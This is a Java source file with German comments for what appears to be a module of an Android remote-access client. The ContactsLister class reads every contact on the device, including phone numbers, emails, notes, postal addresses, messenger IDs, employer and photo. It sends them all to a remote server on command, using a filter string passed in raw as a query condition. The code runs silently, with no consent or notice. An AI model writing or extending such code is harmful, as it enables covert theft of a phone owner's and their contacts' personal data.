package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Bitmap.CompressFormat;
import android.net.Uri;
import android.provider.ContactsContract;

import utils.Contact;

import my.app.client.ClientListener;
import Packet.ContactsPacket;

/**
 * Diese Klasse sammelt alle Informationen über die auf dem Gerät gespeicherten Kontakte.
 */
public class ContactsLister {

	/**
	 * Diese Methode sammelt alle Daten eines Kontaktes und speichert diesen dann in eine ArrayList.
	 * Die ArrayList wird sp�ter in einem Paket gespeichert und an den Server geschickt.
 	 * @param c	Der Service der diese Methode aufruft.
	 * @param channel	Kanal zur Daten�bertragung
	 * @param args	Filter welcher die Kontakte filtert
	 * @return true wenn Kontakte vorhanden, false sosnt.
	 */
	public static boolean listContacts(ClientListener c, int channel, byte[] args) {
		/**
		 * ArrayList l	in dieser Liste werden alle Kontakte gespeichert.
		 */
		ArrayList<Contact> l = new ArrayList<Contact>();
		/**
		 * boolean ret 	Hierbei handelt es sich um den return-Wert. Er wird per default auf false gesetzt.
		 */
		boolean ret = false;
		/**
		 * WHERE_CONDITION	Die �bergebenen Argumente dienen dazu die Kontakte nach belieben zu filtern.
		 */
		String WHERE_CONDITION = new String(args);
		/**
		 * ContentResolver cr 	Dieser wird ben�tigt um die gew�nschten Daten zu erhalten.
		 * Daten werden unter Android mit Hilfe von ContentProvidern gespeichert und abgefragt.
		 */
        ContentResolver cr = c.getContentResolver();
		/**
		 * Cursor cur	 Hier werden die Ergebnisse der Abfrage gespeichert.
		 */
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,WHERE_CONDITION, null, "DISPLAY_NAME ");
		/**
		 * Sollte cur mehr Elemente besitzen so beginnt die Schleife.
		 */
        if (cur!= null && cur.getCount() > 0) {
           while (cur.moveToNext()) {
			   /**
				* Erstellen eines neuen Kontakts zur Speicherung der erhaltenen Daten.
				*/
        	   Contact con = new Contact();
			   /**
				* Die Daten werden aus der Varibalen cur ausgelesen und in den Variablen zwischengespeichert.
				*/
               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
               long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
               
               int times_contacted = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
               long last_time_contacted = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
               String disp_name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
               int starred = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.STARRED));
			   /**
				* Die Zwischengespeicehrten Daten werden dem Kontakt con hinzugef�gt.
				*/
               con.setId(idlong);
               con.setLast_time_contacted(last_time_contacted);
               con.setTimes_contacted(times_contacted);
               con.setDisplay_name(disp_name);
               con.setStarred(starred);
              
               /**
				* Um die Telefonnummern abzufragen wird eine andere Tabelle ben�tigt. Hierzu wird der Kontaktname ausgelesen.
                */
               String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			   /**
				* Dann wird �berpr�ft ob diesem Namen eine Telefonnummer hinterlegt ist
				*/
               if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				   /**
					* Ist dies der Fall so wird nun eine neue ArrayList erstellt in der alle Telefonnummern des Kontakt gespeichert werden.
					* Hierf�r wird ein neuer Cursor erstellt.
					*/
                   // get the phone number
                   Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                          ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
				   if(pCur != null &&pCur.getCount() != 0) {
					   ArrayList<String> phones = new ArrayList<String>();
					   while (pCur.moveToNext()) {
						   String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
						   phones.add(phone);
					   }

					   /**
						* Der Cursor f�r die Telefonnummern wird gel�scht und die Liste dem Kontakt con hinzugef�gt.
						*/
					   pCur.close();
					   con.setPhones(phones);
				   }
				   /**
					* Im n�chsten Schritt werden die gespeicherten Email-Adressen ausgelesen.
					* Auch hierf�r muss wieder ein neuer cursor erstellt werden.
					*/
                  // get email and type
                  Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                           											null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                           											new String[]{id}, null);
				   /**
					* �berpr�fen ob Email-Adressen vorhanden sind.
					*/
                  if(emailCur != null &&emailCur.getCount() != 0) {
					  /**
					   * Erstellen einer neuen ArrayListe zur Speicherung der dem Kontakt hinterlegten Email-Adressen.
					   */
                	  ArrayList<String> emails = new ArrayList<String>();
	                   while (emailCur.moveToNext()) {
	                       // This would allow you get several email addresses if the email addresses were stored in an array
	                       String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	                       //String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	                       emails.add(email);
	                   }
					  /**
					   * Cursor l�schen.
					   */
	                   emailCur.close();
					  /**
					   * Die Liste dem Kontakt hinzuf�gen.
					   */
	                   con.setEmails(emails);
                  }
				   /**
					* Im folgenden werden die den Kontakten hinterlegent Notizen ausgelesen und gespeichert.
					* Auch hierf�r ist wieder ein eigener Cursor von n�tien um die gew�nschten Daten zu erhalten
					* Die Filter um die Notizen von diesem bestimmten Kontakt zu erhalten werden in der Variable noteWhere gespeichert.
					* Sollte es einen Filter f�r die Kontakte geben und nur bestimmte harausgesucht werden, werden diese in der Varibalen noteWhereParams gepspeichert.
					*/
                   // Get note.......
                   String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
				   /**
					* Mit diesem Aufruf wird der Cursor gem�� den oben erstellten Bedingungen erstellt und die entsprechenden Notizdaten aus der Datenbank entnommen.
					*/
                   Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
				   /**
					* Hier wird �berpr�ft ob der Cursor leer ist.
					*/
                   if(noteCur != null && noteCur.getCount() != 0) {
					   /**
						* Wenn nicht so wird eine neue ArrayListe notes erstellt, in der die Notizen gespeichert werden.
						*/
                	   ArrayList<String> notes = new ArrayList<String>();
	                   if (noteCur.moveToFirst()) {
						   /**
							* Nun wird die Notiz aus dem Cursor extrahiert und zwischengespeichert.
							*/
	                       String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
						   /**
							* Im Anschluss wird die Notiz der notes-Liste hizugef�gt.
							*/
	                       notes.add(note);
	                   }
					   /**
						* Nun wird der Cursor nicht mehr ben�tigt. Er wird geschlossen und die notes-Liste wird dem Kontakt con hinzugef�gt.
						*/
	                   noteCur.close();
	                   con.setNotes(notes);
                   }

				   /**
					* Hier wird nun die Adresse ausgelesen.
					* Die Filter und Where-Bedingungen sind die selben wie beim Auslesen der Notizen.
					*/
                   //Get Postal Address....
                   String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
				   /**
					* Den Cursor erstellen um die Adresse des richtigen Kontakts auszulesen.
					*/
                   Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
				   /**
					* �berpr�fen ob der Cursor Daten enth�lt.
					*/
                   if(addrCur!= null && addrCur.getCount() != 0) {
					   /**
						* Solange es ein n�chtes Objekt gibt den Cursor weitervorsetzen und die Daten auslesen.
						*/
	                   while(addrCur.moveToNext()) {
						   /**
							* Die Adressdaten werden nun in Variablen zwischen gespeichert.
							*/
	                       String street = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
	                       String city = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
	                       String state = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
	                       String postalCode = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
	                       String country = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
	                       int type = addrCur.getInt(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
						   /**
							* Die Variablen werden dem con-Kontakt hinzugef�gt
							*/
	                       con.setStreet(street);
	                       con.setCity(city);
	                       con.setRegion(state);
	                       con.setPostalcode(postalCode);
	                       con.setCountry(country);
	                       con.setType_addr(type);
	                   }
					   /**
						* Der Cursor wird gel�scht.
						*/
	                   addrCur.close();
                   }
				   /**
					* Erstellen eines neuen Cursor, um die Intstant Messanger Daten auszulesen
					*/
                   // Get Instant Messenger.........
                   String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                   Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
				   /**
					* �berpr�fen ob der Cursor Daten enth�lt
					*/
                   if(imCur!= null &&imCur.getCount() != 0) {
					   /**
						* ArrayListe erstellen um die Daten zu speichern.
						*/
                	   ArrayList<String> ims= new ArrayList<String>();
	                   if (imCur.moveToFirst()) {
						   /**
							* Daten in Variable imName zwischenspeichern
							*/
	                       String imName = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
	                       //String imType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
						   /**
							* Variable der ArrayListe hinzuf�gen
							*/
						   ims.add(imName);
	                   }
					   /**
						* Cursor l�schen und die ArrayListe dem Kontakt con hinzuf�gen.
						*/
	                   imCur.close();
	                   con.setMessaging(ims);
                   }
				   /**
					* Cursor erstellen, um die Organisationsdaten des richtigen Kontakts zu erhalten.
					*/
                   // Get Organizations.........
                   String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] orgWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                   Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
				   /**
					* �berpr�fen ob der Cursor Daten enth�lt.
					*/
                   if(orgCur!=null && orgCur.getCount() != 0) {
	                   if (orgCur.moveToFirst()) {
						   /**
							* Daten aus dem Cursor auslesen und in Variablen zwischenspeichern.
							*/
	                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
	                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
						   /**
							* Daten der Variablen con hinzuf�gen.
							*/
	                       con.setOrganisationName(orgName);
	                       con.setOrganisationStatus(title);
	                   }
					   /**
						* Den Cursor l�schen.
						*/
	                   orgCur.close();
                   }
				   /**
					* Hier wird nun abschlie�end noch das mit dem Kontakt verkn�pfte Bild ausgelesen.
					*/
                   //Picture Image
           	    	Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
	        	    InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, uri);
	        	    if (input != null) {
						/**
						 * Auslesen des Fotos
						 */
	        	        Bitmap pic = BitmapFactory.decodeStream(input);
	        	              	        
	        	        ByteArrayOutputStream bos = new ByteArrayOutputStream();
						/**
						 * In PNG-Datein komprimieren.
						 */
	        	        pic.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
						/**
						 * In dem Byte-Array bitmapdata speichern
						 */
						byte[] bitmapdata = bos.toByteArray();
						/**
						 * bitmapdata der Vatiablen con hinzuf�gen.
						 */
	        	        con.setPhoto(bitmapdata);
	        	        //Bitmap bitmap = BitmapFactory.decodeByteArray(bitmapdata , 0, bitmapdata .length);
	        	    }
				   /**
					* Den erstellten Kontakt der ArrayListe l hinzuf�gen.
					*/
	        	    l.add(con);
               }
               
           }
			/**
			 * Return-Varibale auf ture setzen.
			 */
           ret = true;
      }
      else
		/**
		 * Wenn keine Kontakte vorhanden return Variable auf false setzten.
		 */
    	  ret = false;

		/**
		 * Neues ContactsPacket erstellen und diesem die Liste l �bergeben.
		 * Danach wird das Packet an den Server gesendet.
		 */
      c.handleData(channel, new ContactsPacket(l).build());
		/**
		 * Die Variable ret wird zur�ckgegeben.
		 */
      return ret;
	}
}
